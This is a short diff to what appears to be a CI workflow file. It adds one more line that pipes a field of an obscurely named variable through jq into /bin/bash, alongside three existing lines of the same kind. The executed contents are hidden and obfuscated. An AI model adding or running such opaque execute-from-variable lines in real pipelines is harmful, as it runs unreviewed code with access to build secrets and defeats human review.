@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$trewf4013" | jq -r .b4 | /bin/bash
           printf '%s' "$tetv41626" | jq -r .elw3 | /bin/bash
           printf '%s' "$dlxm47156" | jq -r .gntyd4 | /bin/bash
+          echo $glnm18056 | jq -r .imvj0477 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
